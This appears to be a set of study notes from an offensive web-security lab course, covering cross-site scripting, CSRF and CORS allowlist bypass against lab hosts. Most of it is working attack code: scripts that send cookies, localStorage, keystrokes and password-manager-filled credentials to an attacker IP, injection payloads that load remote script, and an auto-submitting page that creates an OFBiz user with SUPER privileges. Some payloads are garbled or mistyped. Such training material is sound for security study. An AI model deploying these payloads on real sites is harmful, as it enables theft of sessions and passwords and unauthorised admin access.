Using JavaScript, we can access the cookies of a page using the document.cookie property. We'll extract this value, URL encode it, and use fetch to send it back to our Kali VM. All of this will be done in the xss.js file.

```console
nano xss.js
cat xss.js
```

```js
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.49.51/exfil?data=" + encodedCookie)
```

we'll start the HTTP server with python3 -m http.server 80.

```console
python3 -m http.server 80
```

The payload will append a script element to the HTML document and the script tag will load the xss.js file from our Kali machine. Let's submit the search and exploit the XSS.

```html
<script src="http://192.168.45.171/xss.js"></script>
<img src="x" onerror="http://192.168.45.171/xss.js">
```

If your server is responding with 304 Not Modified, it means the browser is caching the request and not reloading xss.js. This happens because the browser thinks it already has the latest version of the script and doesn’t need to download it again.

```html
<img src="x" onerror="var s=document.createElement('script'); s.src='http://192.168.45.171/xsss.js?' + Math.random(); document.body.appendChild(s);">
```

? + Math.random() adds a random query string (xss.js?0.4567), making it look like a new request every time.

```html
<input type="text" value="http://192.168.45.171/xss.js">
<div onmouseover="http://192.168.45.171/xss.js">Hover Me</div>
<a href="#" onclick="http://192.168.45.171/xss.js">Click Me</a>
```

To exfiltrate localStorage, we'll convert the object into a string, URL encode the string, and use fetch to send the data back to us.

```js
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.49.51/exfil?data=" + encodedData)
```

```console
kali@kali:~/xss$ python3 -m http.server 80
```

Keylogging with XSS is limited though. We are able to keylog by creating an event listener for any keystroke, but it can only be set on the current document. That means if the user is on a different tab or in a different application, we won't be able to intercept their keystrokes. However, if the user is typing a private message or attempting to log in on our target site, we can capture those events.

The JavaScript event for keypresses is keydown, which will be passed into the addEventListener function. This function also accepts a callback function to run for each keydown event. Within this function, we'll send the key that was pressed back to our server.

```js
function logKey(event){
        fetch("http://192.168.49.51/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
```

```console
python3 -m http.server 80
```

While we could add the HTML input tags in the script payload, we'll keep everything in the xss.js file instead to stay organized. In this file, we'll have to create a username and password input. Once the inputs are added to the page, the password manager would automatically fill them with the saved credentials. After some time, we'll send the value of the input back to our Kali machine.

```js
let body = document.getElementsByTagName("body")[0]

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";
  
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";
 
body.append(u)
body.append(p)
 
setTimeout(function(){ 
  fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
}, 5000);
```

```console
    python3 -m http.server 80
```

Let's start by building a small HTML page to exploit the CSRF vulnerabilities in this application to add a new user. We'll start with the basic structure of a form element and JavaScript to submit the form on page load. Let's create a file named offgrid.html in /var/www/html so that later on, we can use Apache to serve the page.

```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="partyId">
    <input type="hidden" name="groupId" value="SUPER">
    <input type="hidden" name="fromDate_i18n">
    <input type="hidden" name="fromDate">
    <input type="hidden" name="thruDate_i18n">
    <input type="hidden" name="thruDate">
  </form>
</body>
</html>
```

```console
sudo systemctl restart apache2
```

Let's copy our existing HTML page into a new file named offgrid1.html

```console
sudo cp /var/www/html/ofbiz.html /var/www/html/ofbiz1.html
```

```html
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="partyId">
    <input type="hidden" name="groupId" value="SUPER">
    <input type="hidden" name="fromDate_i18n">
    <input type="hidden" name="fromDate">
    <input type="hidden" name="thruDate_i18n">
    <input type="hidden" name="thruDate">
  </form>
</body>
</html>
```

Our practice application includes an additional endpoint with flawed allowlist functionality. Let's use curl to send a request to the endpoint. We'll set -X "OPTIONS" to send an OPTIONS request, -i to include headers on the output, -k to allow insecure server connections when using SSL, and finally, the URL.

```console
curl -X "OPTIONS" -i -k https://sandbox/allowlist
```

We didn't specify an Origin header on our request, but the server responded with an Access-Control-Allow-Origin header with the value "https://target-security.com". Perhaps that is the only allowed origin. However, let's try sending a request with an Origin header that includes a modification of that value. We'll use curl again and set -H Origin: http://www.target-security.com to add an Origin header.

```console
curl -X "OPTIONS" -i -H "Origin: http://www.target-security.com" -k https://sandbox/allowlist
```

The server responded with an Access-Control-Allow-Origin value that matches the value we submitted but we only changed the protocol and subdomain. Let's try modifying the end of it too.

```console
curl -X "OPTIONS" -i -H "Origin: http://www.target-security.net" -k https://sandbox/allowlist
```

What will happen if we alter the domain name by prepending something to change the domain name? Let's try it out. We'll use curl again and change the value of the Origin header to "http://fakeotarget-security.com".

```console
curl -X "OPTIONS" -i -H "Origin: http://faketarget-security.com" -k https://sandbox/allowlist
```


